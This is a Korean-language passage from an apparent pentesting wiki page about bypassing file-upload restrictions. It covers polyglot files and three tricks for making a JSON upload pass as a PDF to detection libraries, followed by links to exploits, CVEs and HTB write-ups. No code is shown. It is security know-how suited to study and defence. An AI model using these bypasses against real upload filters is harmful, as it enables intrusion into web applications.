Polyglot files는 하나의 파일이 동시에 여러 파일 형식으로 유효하게 존재할 수 있게 해주는 독특한 도구입니다. 흥미로운 예로 [GIFAR](https://en.wikipedia.org/wiki/Gifar)가 있는데, 이는 GIF와 RAR 아카이브로 동시에 동작하는 하이브리드입니다. 이러한 파일은 GIF/JS나 PPT/JS처럼 다른 조합으로도 만들 수 있습니다.

polyglot의 핵심 유용성은 파일 유형에 따라 파일을 필터링하는 보안 제어를 우회할 수 있다는 점입니다. 많은 애플리케이션은 업로드 가능한 파일 유형을 JPEG, GIF, DOC 등으로 제한해 JS, PHP, Phar 같은 잠재적으로 위험한 형식을 차단합니다. 그러나 polyglot은 여러 파일 형식의 구조적 요건을 동시에 충족함으로써 이러한 제한을 은밀히 우회할 수 있습니다.

다만 polyglot에도 한계는 있습니다. 예를 들어 PHAR 파일(PHp ARchive)과 JPEG를 동시에 포함하는 polyglot은 존재할 수 있지만, 업로드 성공 여부는 플랫폼의 파일 확장자 정책에 달려 있을 수 있습니다. 시스템이 허용 확장자에 대해 엄격하면, 단순한 구조적 이중성만으로는 업로드를 보장하지 못할 수 있습니다.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### PDF인 척 하여 유효한 JSON 업로드

유효한 JSON 파일을 업로드하면서도 PDF인 척해 파일 타입 탐지를 회피하는 방법(기술은 **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)** 참조):

- **`mmagic` library**: 첫 1024 바이트 안에 `%PDF` 매직 바이트가 있으면 유효하다고 판단합니다 (포스트에서 예제 확인)
- **`pdflib` library**: JSON의 필드 안에 가짜 PDF 포맷을 넣어 라이브러리가 이를 PDF로 인식하게 합니다 (포스트에서 예제 확인)
- **`file` binary**: 파일에서 최대 1048576 바이트까지 읽습니다. JSON을 그보다 크게 만들어 파일 내용을 json으로 파싱하지 못하게 한 뒤, JSON 내부에 실제 PDF의 초기 부분을 넣으면 PDF로 인식합니다

## References

- [When Audits Fail: Four Critical Pre-Auth Vulnerabilities in TRUfusion Enterprise](https://www.rcesecurity.com/2025/09/when-audits-fail-four-critical-pre-auth-vulnerabilities-in-trufusion-enterprise/)

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
- [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
- [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
- [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)
- [https://blog.doyensec.com/2025/01/09/cspt-file-upload.html](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)
- [usd HeroLab – Gibbon LMS arbitrary file write (CVE-2023-45878)](https://herolab.usd.de/security-advisories/usd-2023-0025/)
- [NVD – CVE-2023-45878](https://nvd.nist.gov/vuln/detail/CVE-2023-45878)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)
- [CVE-2024-21546 – NVD entry](https://nvd.nist.gov/vuln/detail/CVE-2024-21546)
- [PoC gist for LFM .php. bypass](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca)
- [0xdf – HTB Environment (UniSharp LFM upload → PHP RCE)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Microsoft – mklink (command reference)](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

{{#include ../../banners/hacktricks-training.md}}
